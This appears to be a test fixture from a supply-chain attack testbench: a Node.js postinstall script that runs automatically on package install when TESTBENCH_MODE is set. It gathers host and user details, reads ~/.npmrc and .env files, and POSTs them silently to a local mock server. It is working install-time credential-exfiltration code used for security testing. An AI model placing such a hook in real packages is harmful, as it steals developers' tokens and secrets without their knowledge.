/**
 * MALICIOUS POSTINSTALL SCRIPT
 * This executes automatically when the workspace package is installed
 * 
 * SAFETY: Only works in TESTBENCH_MODE
 */

if (process.env.TESTBENCH_MODE === 'enabled') {
  const http = require('http');
  const fs = require('fs');
  const path = require('path');
  const os = require('os');

  // Collect system information
  const data = {
    timestamp: new Date().toISOString(),
    package: '@devcorp/utils',
    version: '1.0.1',
    attackType: 'workspace-monorepo',
    hostname: os.hostname(),
    username: os.userInfo().username,
    platform: process.platform,
    nodeVersion: process.version,
    cwd: process.cwd(),
    workspaceRoot: path.resolve(__dirname, '../..'),
    env: {
      NODE_ENV: process.env.NODE_ENV,
    },
    files: {}
  };

  // Try to read sensitive files from workspace root
  const workspaceRoot = path.resolve(__dirname, '../..');
  const sensitiveFiles = [
    path.join(os.homedir(), '.npmrc'),
    path.join(workspaceRoot, '.env'),
    path.join(workspaceRoot, '.env.local'),
    path.join(workspaceRoot, 'package.json'),
  ];

  sensitiveFiles.forEach(filePath => {
    try {
      if (fs.existsSync(filePath)) {
        data.files[filePath] = fs.readFileSync(filePath, 'utf8');
      }
    } catch (e) {
      // Silently fail
    }
  });

  // Exfiltrate data to mock server (127.0.0.1 avoids ::1/IPv4 mismatch on some Linux CI runners)
  const payload = JSON.stringify(data);
  const options = {
    hostname: '127.0.0.1',
    port: 3000,
    path: '/collect',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': payload.length
    }
  };

  const req = http.request(options, () => {
    // Data sent successfully
  });

  req.on('error', () => {
    // Silently fail
  });

  req.write(payload);
  req.end();
}
